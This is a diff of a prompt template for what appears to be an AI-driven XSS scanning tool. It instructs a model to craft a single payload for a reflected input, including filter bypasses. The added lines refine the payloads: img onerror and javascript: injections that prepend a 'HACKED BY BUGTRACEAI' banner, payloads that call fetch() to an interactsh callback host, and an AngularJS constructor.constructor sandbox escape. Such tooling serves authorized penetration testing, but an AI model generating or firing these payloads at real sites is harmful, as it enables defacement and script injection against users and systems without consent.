@@ -19,18 +19,23 @@ Your task: Analyze the provided HTML and generate a payload that will execute Ja
 
 1. The payload SHOULD include this callback URL for validation: {interactsh_url} (or use Visual Defacement).
 2. **VISUAL PROOF RULE**: For Reflected/DOM XSS, ALWAYS prefer payloads that create a visible element (e.g., `document.body.prepend(div with 'HACKED BY BUGTRACEAI')`) over `alert()`. alerts are ephemeral; DOM changes are persistent for screenshots.
-3. IMPORTANT: DO NOT include the parameter name (e.g., `searchTerm=`) in the `<payload>` tag. Return ONLY the payload value itself.
-4. Example payloads:
-   - `<img src=x onerror=var b=document.createElement('div');b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>`
-   - `javascript:var b=document.createElement('div');b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)`
+3. IMPORTANT: DO NOT include the parameter name (e.g., `param=`) in the `<payload>` tag. Return ONLY the payload value itself.
+4. **BANNER JS RULES** (a banner that breaks any of these renders NOTHING):
+   - **No whitespace** anywhere in the JS. It is often spliced into an UNQUOTED HTML attribute (`<svg onload=`...`>`), and the HTML tokenizer ends an unquoted attribute value at the first space — the rest becomes junk attributes. So: no `var `/`let ` keyword, and write the label's spaces as `\x20` escapes (the JS engine turns them back into real spaces).
+   - **No `>`** anywhere: in an unquoted attribute value it closes the tag, so an arrow function (`(d)=>{...}`) is truncated.
+   - **Strict-mode safe**: a bare `d=...` is an implicit global, which is a `ReferenceError` under `"use strict"` and inside `<script type="module">`. Pass the element into a function expression instead.
+   - **Backticks only** for JS strings, so the banner can also be nested inside single- or double-quoted contexts.
+5. Example payloads (reuse this exact banner body):
+   - ``<img src=x onerror=(function(d){d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`);d.innerText=`HACKED\x20BY\x20BUGTRACEAI`;document.body.prepend(d)})(document.createElement(`div`))>``
+   - ``javascript:(function(d){d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`);d.innerText=`HACKED\x20BY\x20BUGTRACEAI`;document.body.prepend(d)})(document.createElement(`div`))``
    - `<script>fetch('https://{interactsh_url}')</script>`
    - `"><img src=x onerror=fetch('https://{interactsh_url}')>`
 
-5. Analyze the EXACT context where the probe string "{probe}" reflects
+6. Analyze the EXACT context where the probe string "{probe}" reflects
 
-6. Generate ONE optimal payload - not a list
+7. Generate ONE optimal payload - not a list
 
-7. If you detect filters, generate a bypass payload
+8. If you detect filters, generate a bypass payload
 
 ## CONTEXT TYPES AND PAYLOADS
 
@@ -79,8 +84,8 @@ If Global Context contains "AngularJS" or "ng-app":
 3. **Do NOT only try to break out**: Do not assume you must close the attribute (`">`) first. The vulnerability might be the interpolation itself.
 4. **Sandbox Escape**: Use known sandbox escapes for Angular 1.x (e.g., accessing `constructor.constructor`).
 
-**Example Angular Payload:**
-`{{constructor.constructor('var b=document.createElement("div");b.innerText="HACKED BY BUGTRACEAI";document.body.prepend(b)')()}}`
+**Example Angular Payload:** (same banner body — its backtick-only strings nest safely inside the single-quoted expression)
+``{{constructor.constructor('(function(d){d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`);d.innerText=`HACKED\x20BY\x20BUGTRACEAI`;document.body.prepend(d)})(document.createElement(`div`))')()}}``
 
 **IMPORTANT:**
 
